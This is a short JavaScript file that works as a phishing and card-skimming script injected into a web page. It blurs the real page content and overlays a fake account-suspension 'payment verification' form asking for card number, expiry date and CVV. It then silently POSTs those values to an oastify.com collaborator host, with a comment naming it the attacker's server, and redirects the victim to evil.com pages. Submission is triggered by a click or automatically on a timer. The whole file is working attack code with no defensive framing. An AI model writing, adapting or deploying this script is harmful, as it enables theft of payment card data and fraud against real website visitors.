const redirectMap = {
  '/login': 'https://evil.com/login',
  '/account': 'https://evil.com/account',
  '/support': 'https://evil.com/support'
};

const target = redirectMap[window.location.pathname] || 'https://evil.com';

// Hide legitimate content and show payment prompt
document.querySelectorAll('header, main, footer').forEach(el => {
  el.style.filter = 'blur(2px)';
  el.style.pointerEvents = 'none';
  el.style.userSelect = 'none';
});

// Create payment prompt overlay
const overlay = document.createElement('div');
overlay.className = 'phishing-overlay';
overlay.innerHTML = `
  <div class="phishing-container">
    <h3>Payment Verification Required</h3>
    <p>Your account needs immediate verification to prevent suspension.</p>
    <div class="payment-form">
      <input type="text" placeholder="Card Number" id="cardNumber" class="payment-input">
      <input type="text" placeholder="Expiry Date" id="expiryDate" class="payment-input">
      <input type="text" placeholder="CVV" id="cvv" class="payment-input">
      <button id="verify-btn" class="payment-button">Verify Now</button>
    </div>
    <p class="small-text">You will be redirected shortly after verification.</p>
  </div>
`;
document.body.appendChild(overlay);

// Function to steal payment data and send to attacker's server
function stealPaymentData() {
  const cardNumber = document.getElementById('cardNumber').value;
  const expiryDate = document.getElementById('expiryDate').value;
  const cvv = document.getElementById('cvv').value;

  // Send stolen data to attacker's server (Burp Collaborator)
  fetch(`https://e6lwbejn7uzmw92p69m5iyubj2ptdx1m.oastify.com/steal`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ cardNumber, expiryDate, cvv }),
    mode: 'no-cors' // Avoid CORS issues
  }).catch(() => {}); // Silently fail if request is blocked

  // Redirect to phishing site after stealing data
  window.location.replace(target);
}

// Attach event listener to the button
document.getElementById('verify-btn')?.addEventListener('click', stealPaymentData);

// Auto-submit after 5 seconds if user doesn't act
setTimeout(stealPaymentData, 4000);

// Redirect after 2 seconds regardless of user action
setTimeout(() => {
  window.location.replace(target);
}, 5000);
